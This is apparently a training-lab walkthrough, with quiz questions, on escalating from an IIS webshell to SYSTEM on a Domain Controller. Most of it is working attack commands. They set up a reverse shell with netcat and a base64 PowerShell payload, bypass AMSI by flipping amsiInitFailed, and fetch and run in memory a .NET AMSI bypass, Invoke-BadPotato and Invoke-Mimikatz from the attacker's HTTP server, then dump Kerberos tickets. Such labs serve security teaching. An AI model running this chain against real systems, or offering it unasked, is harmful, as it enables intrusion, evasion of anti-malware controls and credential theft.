#Local Privilege Escalation
In this attack, we'll leverage remote command execution under a service account security context to compromise the Domain Controller locally. To reach remote command execution position perform the IIS abuse attack, also present in this lab.

Once the attacker achieves remote command execution under the IIS service Application Pool Identity, the next objective is to establish a reverse shell. This is because the uploaded webshell can only run single, stateless commands. It does not maintain a persistent session. To gain more control and flexibility, the attacker needs to spawn a reverse shell that allows interactive command execution and session management.

To do so, run the following:
```
#in the webshell directory
python3 reverse_shell_command.py 192.168.122.2 4444
```

This script outputs a powershell command encoded in B64, for obfuscation and to prevent special character issues. The command will initiate a TCP connection from the machine running the command to port 4444 at IP 192.168.122.2 (the attacker), and listen for powershell commands.

We can get the output from the command, and send it to our webshell endpoint. Before doing so, we'll use netcat to start listening for a connection in port 4444 of the attacker machine.
```
#in the attacker2 terminal
nc -nlvp 4444
#in the attacker terminal
curl -X POST http://192.168.122.10/upload/webshell.aspx --data-urlencode "param=<output from reverse_shell_command.py>"
```

At this point, you've supposedly received a connection in port 4444, meaning the reverse shell has been set up and now you can run commands on a single persistent session, instead of running stateless commands.

The attacker's objective will be to run a mallicious script that uses service account privileges to reach SYSTEM privileges. To be able to run mallicious scripts, AMSI must be bypassed. Anti-Malware Scan Interface scans scripts before execution and prevents it if they're suspicious. AMSI also prevents certain well-known scritps from running. Take a look:

```
Invoke-Mimikatz
echo $Error[0].Exception.Message
```

The error message tells us that this script can't be run due to mallicious content.
Let's try and bypass AMSI in the current powershell process to see if anything different happens:
```
$w=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
$f=$w.GetField('amsiInitFailed','NonPublic,Static');
$f.SetValue($null,$true)

Invoke-Mimikatz
echo $Error[0].Exception.Message
```

This time, we've set the amsiInitFailed flag to true, which indicates powershell that AMSI has failed. Now, powershell won't call AMSI since it has supposedly failed. If you try to run Invoke-Mimikatz again, you'll now get a different error, indicating that there's no such cmdlet, meaning that the AMSI has been bypassed in this session.

Now, the attacker's objective is to bypass AMSI at the .NET level. At this point, the AMSI has been bypassed in the current Powershell session, but the mallicious script we wish to use down the line uses other AMSI-aware processes, namely, C# executables. If we don't bypass AMSI at the .NET level, AMSI will stop our mallicious script from executing.

To bypass AMSI at the .NET level, we'll use 'amsi-net-bypass.txt', present in the webshell directory.
```
#In the Attacker terminal
python3 -m http.server 8081
#In the Attacker2 terminal
(new-object system.net.webclient).downloadstring('http://192.168.122.2:8081/amsi-net-bypass.txt')|IEX
```
This way, we've loaded the 'amsi-net-bypass.txt' into memory and executed it. It should output 'True', meaning that it worked. Important to notice that we've loaded the script into memory, not into disk. Loading mallicious scripts to disk may trigger Anti-Virus tools, so it's imperative to work only in memory.

At this point, the attacker can run mallicious scripts, as long as these scripts do not touch the disk. Let's now escalate our privileges locally, going from the IIS service security context to the SYSTEM security context. This will be done with the 'Invoke-BadPotato.ps1' script:

```
iex(new-object net.webclient).downloadstring('http://192.168.122.2:8081/PowerSharpPack/PowerSharpBinaries/Invoke-BadPotato.ps1')
Invoke-BadPotato
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
#you can also experiment with other tools such as Mimikatz
iex(new-object net.webclient).downloadstring('http://192.168.122.2:8081/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command "sekurlsa::tickets"
```

This way, an attacker is able to escalate its privileges locally, from a service account security context to the SYSTEM security context, having full control over the DC, in this case.

!!! question
    Why is it necessary to establish a reverse shell instead of using the webshell directly?
??? success "Answer"
    In order to be able to maintain a session state. If otherwise the attacker would for example bypass AMSI through the webshell, state would not be maintained, so it would be as nothing was bypassed, rendering this attack useless.
!!! question
    What technique does Invoke-BadPotato use to escalate privileges?
??? success "Answer"
    Invoke-BadPotato escalates privileges by exploiting Windows services that run as SYSTEM and improperly handle token impersonation. It leverages the Printer Bug to trick a SYSTEM-level process to authenticate to an attacker-controlled named pipe. This will allow the attacker to impersonate the SYSTEM access token and spawn a process with SYSTEM-level privileges. This technique requires the attacker's compromised account to hold the SeImpersonatePrivilege, which is commonly available to service accounts like those used by IIS.